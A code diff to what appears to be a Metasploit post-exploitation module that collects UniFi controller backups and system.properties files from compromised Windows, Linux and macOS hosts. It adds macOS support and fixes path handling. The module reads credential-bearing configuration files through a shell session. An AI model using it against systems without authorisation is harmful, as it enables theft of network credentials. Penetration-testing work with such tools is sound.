@@ -8,6 +8,7 @@ require 'zip'
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
+  include Msf::Post::OSX::System
 
   def initialize(info={})
     super( update_info( info,
@@ -71,9 +72,9 @@ class MetasploitModule < Msf::Post
     when 'windows'
       files = session.fs.dir.foreach(d)
     when 'linux', 'osx'
-      files = cmd_exec("ls #{d}").split(/\r\n|\r|\n/)
+      # osx will have a space in it by default, so we wrap the directory in quotes
+      files = cmd_exec("ls '#{d}'").split(/\r\n|\r|\n/)
     end
-
     files.each do |file|
       full = "#{d}/#{file}"
       if directory?(full) && !['.', '..'].include?(file)
@@ -132,8 +133,8 @@ class MetasploitModule < Msf::Post
       backup_locations = []
       sprop_locations = []
       get_users.each do |user|
-        backup_locations << "/Users/#{user}/Library/Application Support/UniFi/data/backup"
-        sprop_locations  << "/Users/#{user}/Library/Application Support/Unifi/data/system.properties"
+        backup_locations << "/Users/#{user['name']}/Library/Application Support/UniFi/data/backup"
+        sprop_locations  << "/Users/#{user['name']}/Library/Application Support/Unifi/data/system.properties"
       end
     end
 
